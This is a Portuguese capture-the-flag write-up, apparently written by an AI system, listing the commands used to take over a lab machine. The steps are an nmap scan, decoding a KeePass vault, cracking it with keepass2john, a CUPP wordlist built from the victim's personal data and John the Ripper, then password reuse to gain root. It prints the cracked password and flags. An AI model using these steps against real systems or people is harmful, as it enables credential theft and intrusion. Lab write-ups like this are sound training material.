*Nota de alinhamento: Revisando estritamente o meu histórico de interação neste CTF, eu **não** utilizei ferramentas como `gobuster`, `dirb`, `netcat` ou scripts de exploits/privilégio de terceiros. A invasão foi baseada inteiramente em OSINT, quebra de hash local e exploração de falha humana (reutilização de senhas). O relatório abaixo contém rigorosamente todas as ferramentas e comandos que de fato executei e discuti.*

---

[Reconhecimento / OSINT]
Objetivo: Mapear portas abertas e extrair dados biográficos de e-mails expostos para montar o ataque.
Ferramentas e Comandos exatos:

```bash
nmap -sV -sC -A -T4 <IP_DO_ALVO>

```

Resultado: Serviços identificados e dados vitais coletados (Lhotse, 18051956, BestMountainsInc).

[Exfiltração / CyberChef]
Objetivo: Decodificar o cofre de senhas exfiltrado em texto para o formato binário original.
Ferramentas e Comandos exatos:

```text
CyberChef -> Painel Input (Texto Base64) -> Receita: "From Base64" -> Painel Output (Salvar)

```

Resultado: Arquivo `Database.kdbx` salvo localmente.

[Extração de Hash / keepass2john]
Objetivo: Extrair o cabeçalho de criptografia do banco de dados para permitir o ataque de força bruta.
Ferramentas e Comandos exatos:

```bash
keepass2john Database.kdbx > keepass_hash.txt

```

Resultado: Arquivo `keepass_hash.txt` gerado.

[Geração de Wordlist / CUPP]
Objetivo: Criar um dicionário focado e personalizado usando os dados biográficos da vítima.
Ferramentas e Comandos exatos:

```bash
python3 cupp.py -i

```

Resultado: Wordlist customizada `mount.txt` extraída.

[Quebra de Senha / John the Ripper]
Objetivo: Atacar o hash extraído do cofre utilizando o dicionário gerado.
Ferramentas e Comandos exatos:

```bash
john --wordlist=mount.txt keepass_hash.txt

```

Resultado: Senha mestra descoberta: `Lhotse56185`.

[Acesso ao Cofre / KeePassXC]
Objetivo: Instalar o gerenciador, abrir o cofre com a senha quebrada e extrair credenciais.
Ferramentas e Comandos exatos:

```bash
keepassxc Database.kdbx
sudo apt update && sudo apt install keepassxc-full -y
keepassxc Database.kdbx

```

Resultado: Cofre aberto e senha do usuário `kangchenjunga` revelada.

[Acesso Inicial / Flag Local]
Objetivo: Autenticar no servidor como o usuário comprometido e coletar a primeira flag.
Ferramentas e Comandos exatos:

```bash
su kangchenjunga
cat local.txt
cat mynotes.txt

```

Resultado: Flag capturada (`97a805cb710dcb97342a48092876df22`) e descoberta a pista de que o root usa esta mesma conta.

[Enumeração de Privilégios / find]
Objetivo: Procurar permissões de execução administrativa ou binários SUID mal configurados.
Ferramentas e Comandos exatos:

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null

```

Resultado: `sudo` negado e SUIDs padrão. A elevação dependerá da exploração da reutilização de credenciais lida na nota.

[Escalada de Privilégio / Flag Root]
Objetivo: Alternar para a conta de superusuário validando a senha reaproveitada e capturar a flag final.
Ferramentas e Comandos exatos:

```bash
su root
cat root.txt

```

Resultado: Acesso root obtido. Flag capturada (`a4102d310a621855d9ed587f29eed757`).